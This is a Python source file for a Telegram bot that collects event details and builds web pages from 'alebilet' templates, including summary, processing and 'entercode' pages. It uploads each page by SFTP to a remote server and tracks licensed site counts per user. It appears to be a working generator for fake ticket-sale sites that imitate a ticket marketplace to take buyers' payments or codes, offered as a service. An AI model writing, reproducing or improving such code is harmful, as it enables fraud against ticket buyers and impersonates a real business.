from telegram import Update
from telegram.ext import ContextTypes
from config import AUTH_ID , REMOTE_HOST , USERNAME , PASSWORD
import os
import random
import string
import shutil
import paramiko 
import sqlite3


# Define the sequence of questions
questions = [
    "Question 1: Please enter the title:",
    "Question 2: Please enter the location:",
    "Question 3: Please enter the new price per ticket:",
    "Question 4: Please enter the original price per ticket:",
    "Question 5: Please enter the amount of tickets:",
    "Question 6: Please enter the date e.g 20 September 2024, 16:00:",
    "Question 7: Please enter the sector and row of tickets e.g Floor 1 , Seat 5:"
]

async def generatebilet(update: Update, context: ContextTypes.DEFAULT_TYPE):

    print(f"User ID: {update.effective_user.id}")

    if str(update.effective_user.id) != AUTH_ID:  
        if update.message:
            await update.message.reply_text(f"⛔ You are not authorized to use this command.")
        return

    context.user_data['expecting_bilet'] = 0


    if update.message:
        
        await update.message.reply_text(questions[context.user_data['expecting_bilet']])
    elif update.callback_query:
        
        await update.callback_query.answer()  
        await update.callback_query.edit_message_text(questions[context.user_data['expecting_bilet']])


async def handle_bilet_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    
    if str(update.effective_user.id) != AUTH_ID:
        await update.message.reply_text(f"⛔ You are not authorized to use this command.")
        return
    user_id = update.effective_user.id

    conn = sqlite3.connect("userdata.db")
    cursor = conn.cursor()

    cursor.execute("SELECT websites FROM licenses WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()

    if result is None:
        
        website_count = 0
    else:
        websites_str = result[0]
        if websites_str is None or websites_str.strip() == "":
            website_count = 0
        else:
            website_count = len(websites_str.split(','))

    if website_count >= 10:
        await update.message.reply_text("⛔ You cannot create more than 10 websites.")
        return




    current_question = context.user_data.get('expecting_bilet')

    if current_question is None:
        await update.message.reply_text("❌ No active process found.")
        return

    try:
        if current_question == 0:  
            title = update.message.text
            context.user_data['title'] = title
            context.user_data['expecting_bilet'] = 1 
            print(f"Expecting question index: {context.user_data['expecting_bilet']}")
            await update.message.reply_text(questions[context.user_data['expecting_bilet']])

        elif current_question == 1:  
            location = update.message.text
            context.user_data['location'] = location
            context.user_data['expecting_bilet'] = 2 
            await update.message.reply_text(questions[context.user_data['expecting_bilet']])

        elif current_question == 2:  
            try:
                price = float(update.message.text)
                context.user_data['price'] = price
                context.user_data['expecting_bilet'] = 3  
                await update.message.reply_text(questions[context.user_data['expecting_bilet']])

            except ValueError:
                await update.message.reply_text("❌ Invalid price. Please enter a valid number.")
                return
        
        elif current_question == 3:  
            try:
                price = float(update.message.text)
                context.user_data['ogprice'] = price
                context.user_data['expecting_bilet'] = 4  
                await update.message.reply_text(questions[context.user_data['expecting_bilet']])

            except ValueError:
                await update.message.reply_text("❌ Invalid price. Please enter a valid number.")
                return

        elif current_question == 4:  
            try:
                tickets = int(update.message.text)
                context.user_data['tickets'] = tickets
                context.user_data['expecting_bilet'] = 5
                await update.message.reply_text(questions[context.user_data['expecting_bilet']])

            except ValueError:
                await update.message.reply_text("❌ Invalid number of tickets. Please enter a valid integer.")
                return

        elif current_question == 5: 
            date = update.message.text
            context.user_data['date'] = date
            context.user_data['expecting_bilet'] = 6
            await update.message.reply_text(questions[context.user_data['expecting_bilet']])

        elif current_question == 6:  
            sector_row = update.message.text
            context.user_data['sector_row'] = sector_row
            context.user_data['expecting_bilet'] = None  

            await update.message.reply_text(
                f"✅ All information collected:\n"
                f"- Title: {context.user_data['title']}\n"
                f"- Location: {context.user_data['location']}\n"
                f"- Price: ${context.user_data['price']}\n"
                f"- Original Price: ${context.user_data['ogprice']}\n"
                f"- Tickets: {context.user_data['tickets']}\n"
                f"- Date: {context.user_data['date']}\n"
                f"- Sector and Row: {context.user_data['sector_row']}"
            )
            extra_files = [
                './Templates/alebilet/podsumowanie.html',
                './Templates/alebilet/processing.html',
                './Templates/alebilet/entercode.html'
                ]
            try:
                random_folder = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
                target_dir = f"Templates/generated/{random_folder}"
                os.makedirs(target_dir, exist_ok=True)
                html_template_path = "Templates/alebilet/main_site.html"
                html_output_path = os.path.join(target_dir, "index.html")
                with open(html_template_path, 'r', encoding='utf-8') as file:
                    html = file.read()

                
                html = html.replace("{{title}}", context.user_data['title'])
                html = html.replace("{{location}}", context.user_data['location'])
                html = html.replace("{{price}}", str(context.user_data['price']))
                html = html.replace("{{ogprice}}", str(context.user_data['ogprice']))
                html = html.replace("{{tickets}}", str(context.user_data['tickets']))
                html = html.replace("{{date}}", context.user_data['date'])
                sector_row = context.user_data['sector_row']
                parts = sector_row.split(',')
                part_0 = parts[0].strip() if len(parts) > 0 else ''
                part_1 = parts[1].strip() if len(parts) > 1 else ''
                html = html.replace("{{ sector_row.split(',')[0] }}", part_0)
                html = html.replace("{{ sector_row.split(',')[1] }}", part_1)

                with open(html_output_path, 'w', encoding='utf-8') as file:
                    file.write(html)
                await update.message.reply_text("File Printed Successfully")
                destination_path = os.path.join(target_dir, 'index.html')
                if os.path.abspath(html_output_path) != os.path.abspath(destination_path):
                    shutil.copy(html_output_path, destination_path)

                ssh_host = REMOTE_HOST
                ssh_port = 22
                ssh_user = USERNAME
                ssh_pass = PASSWORD
                remote_path = f"/var/www/html/{random_folder}"

                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ssh_host, port=ssh_port, username=ssh_user, password=ssh_pass)
                def sftp_mkdirs(sftp, remote_directory):
                    dirs = []
                    while remote_directory not in ('/', ''):
                        dirs.append(remote_directory)
                        remote_directory, _ = os.path.split(remote_directory)
                    dirs = dirs[::-1]
                    for directory in dirs:
                        try:
                            sftp.stat(directory)
                        except IOError:
                            sftp.mkdir(directory)

                sftp = ssh.open_sftp()
                try:
                    sftp.mkdir(remote_path)
                except IOError:
                    pass  

                for root, dirs, files in os.walk(target_dir):
                    for file_name in files:
                        local_path = os.path.join(root, file_name)
                        rel_path = os.path.relpath(local_path, target_dir)
                        remote_file_path = os.path.join(remote_path, rel_path).replace('\\', '/')

                        remote_dir = os.path.dirname(remote_file_path)
                        sftp_mkdirs(sftp, remote_dir) 

                        sftp.put(local_path, remote_file_path)
                    
                for extra_file in extra_files:
                    file_name = os.path.basename(extra_file)
                    remote_file_path = os.path.join(remote_path, file_name).replace('\\', '/')
                    sftp.put(extra_file, remote_file_path)


                sftp.close()
                ssh.close()
                live_url = f"http://{ssh_host}/{random_folder}"
                await update.message.reply_text(f"✅ Site uploaded successfully.\n🌐 Live URL: {live_url}")
                conn = sqlite3.connect("userdata.db")
                cursor = conn.cursor()
                cursor.execute("SELECT websites FROM licenses WHERE user_id = ?", (user_id,))
                result = cursor.fetchone()
                if result is None or result[0] is None or not result[0].strip():
                    updated_websites = random_folder
                else:
                    updated_websites = result[0] + ',' + random_folder
                cursor.execute("UPDATE licenses SET websites = ? WHERE user_id = ?", (updated_websites, user_id))
                conn.commit()
                conn.close()

            except Exception as e:
                print(f"Error during HTML file generation: {e}")
                await update.message.reply_text(f"❌ Error during HTML file generation: {e}")


    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
        context.user_data['expecting_bilet'] = None  
